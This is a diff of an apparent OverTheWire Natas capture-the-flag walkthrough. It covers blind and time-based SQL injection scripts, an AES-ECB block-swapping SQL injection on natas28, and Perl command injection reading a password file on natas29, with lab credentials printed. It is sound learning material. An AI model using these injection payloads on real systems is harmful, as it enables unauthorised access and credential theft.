@@ -421,41 +421,6 @@ URL:      http://natas17.natas.labs.overthewire.org
 
 This is just natas15 but now it doesn't confirm if we got it right with the text. Both correct and incorrect usernames don't have anything to display. So we have to rely purely on SQL to brute force. One way we can do this is with the `sleep(secs)` command, so that if a string exists in the password then it will sleep for a number of seconds (We'll use two, but you can increase or decrease it if you want). The input will look like this: `natas16" AND password LIKE BINARY "(pass)&" AND sleep(2) #` You'll be waiting alot longer though. Here's the updated code.
 
-```python
-import requests
-target = 'http://natas17.natas.labs.overthewire.org'
-charset_0 = (
-    '0123456789' +
-    'abcdefghijklmnopqrstuvwxyz' +
-    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-)
-webauth = ('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
-charset_1 = ''
-for c in charset_0:
-    username = ('natas18" AND password LIKE BINARY "%' + c +'%" AND sleep(2) #')
-    r = requests.get(target,
-        auth=webauth,
-        params={"username": username}
-    )
-    if r.elapsed.total_seconds() >= 2:
-        charset_1 += c
-        print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
-
-password = ""
-while len(password) != 32:
-    for c in charset_1:
-        t = password + c
-        username = ('natas18" AND password LIKE BINARY "' + t +'%" AND sleep(2) #')
-        r = requests.get(target,
-            auth=webauth,
-            params={"username": username}
-        )
-        if r.elapsed.total_seconds() >= 2:
-            print ('PASS: ' + t.ljust(32, '*'))
-            password = t
-            break
-```
-
 We got this password:
 
 ```
@@ -676,7 +641,7 @@ class Logger {
     private $logFile;
     private $initMsg;
     private $exitMsg;
-    
+
     function __construct(){
         // initialise variables
         $this->initMsg="#--session started--#\n";
@@ -687,7 +652,6 @@ class Logger {
 $log = new Logger();
 print base64_encode(serialize($log));
 ?>
-
 ```
 
 Running this code will return our new `drawing` cookie value: 
@@ -751,6 +715,96 @@ I noticed when searching for something such as "test", it will go to `search.php
 
 Another search with "passwords": `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIQ+2QTbcCowp8YHJ+hQkThoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=`
 
-Playing with the values a bit gave me error messages such as `Zero padding found instead of PKCS#7 padding`, so this means the query uses AES with ECB mode, with blocks sized 21 characters each.
+Playing with the values a bit gave me error messages such as `Zero padding found instead of PKCS#7 padding`, so this means the query uses AES with ECB mode, with blocks sized 16 bytes each (The query is in base64, so you are better off converting to hex for easier conversion).
 
-TBD
+I noticed that all searches start with two blocks,`G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP` ,so we do not need to worry about those.
+
+The first step I did is figure out how many characters it'll take to fill out the third block. So i wrote python code that searches for a query of spaces, going from 1 space to 16 spaces.
+
+```python
+import requests
+from urllib.parse import unquote
+target = 'http://natas28.natas.labs.overthewire.org/'
+webauth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+letters = 1
+while (letters <= 16):
+    query = ' ' * letters
+    r = requests.get(target, 
+    auth=webauth,
+    params={"query": query}
+    )
+    print(str(letters) + '\t' + unquote(r.url).split("G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP")[-1])
+    letters += 1
+```
+
+I noticed that after 10 spaces, the block will stay the same, as `ItlMM3qTizkRB5P2zYxJsb`. That means we can use the first 9 spaces to check if a character is being filtered with a backslash `\`.  I did this by using the backslash as my 10th character first, then comparing it to special characters that I may use for my SQL injection attack, including quotes, hashes, or semicolons. I replaced the bottom of my python code with this:
+
+```python
+letters = ['\\','\'',';','#']
+for letter in letters:
+    query = (' ' * 9) + letter
+    r = requests.get(target, 
+    auth=webauth,
+    params={"query": query}
+    )
+    print(letter + '\t' + unquote(r.url).split("G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP")[-1])
+```
+
+After running it I noticed that the escape backslash and the single quote character `'` match, with the third block being `I5F6VCqpwV1FClOSe+OGDl`. This means that the website is replacing every `'`  with `\'`. Luckily, it's our only character being escaped, and it only has to be on the front, so we can just replace it with our 10-space block `ItlMM3qTizkRB5P2zYxJsb`.
+
+To do this, I planned on using this SQL injection attack: `' UNION SELECT ALL password FROM users;#`. The table is based on last level's SQL table. I also need to put the 9 spaces on the front, so the query we need to search for is `         ' UNION SELECT ALL password FROM users;#`.
+
+The query we get is `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI5F6VCqpwV1FClOSe+OGDl+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cnA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=` All we need to do is to replace the blocks as mentioned before. Our new query is `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cnA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=`. 
+
+After URL encoding the final website should be `http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cnA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D` Visit it and we will get the password for natas29.
+
+```
+Whack Computer Joke Database
+    31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+```
+
+I'd have no idea how to do this level if not for [this video](https://www.youtube.com/watch?v=oWmfYgCYmCc)
+
+# 29
+
+```
+Username: natas29
+URL:      http://natas29.natas.labs.overthewire.org
+```
+
+This website has a dropdown with a bunch of files called `perl underground X`, X being from 1 to 5. Apparantly it includes stuff about Perl in general, also some rants and evangelism on perl (for some reason i cannot find anything about Perl Underground on google except for the same text files, shame).  This was completely unrelated to the challenge though, so I decided to just look at ways to do bash command injection using perl.
+
+Since the `file` variable includes the file name, you can pass commands through that. Apparantly one way you can do this is by posting the value as `|(cmd)%00`, so you can do `index.pl?file=|ls%00` to get the files in the directory, for example. 
+
+However, trying to access `/etc/natas_webpass/natas29` just returns `meeeeeep!`. According to the source code of index.pl (which you can access by doing `index.pl?file=|cat index.pl%00`) it shows that posting anything that includes `natas` will fail.
+
+```perl
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+```
+
+Though there's an easy way to bypass this by using Bash wildcards. So replacing every `natas` with just an asterisk would do the trick. I put `?file=|cat /etc/*_webpass/*30%00` and got the password.
+
+```
+WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+```
+
+# 30
+
+```
+Username: natas30
+URL:      http://natas30.natas.labs.overthewire.org
+```
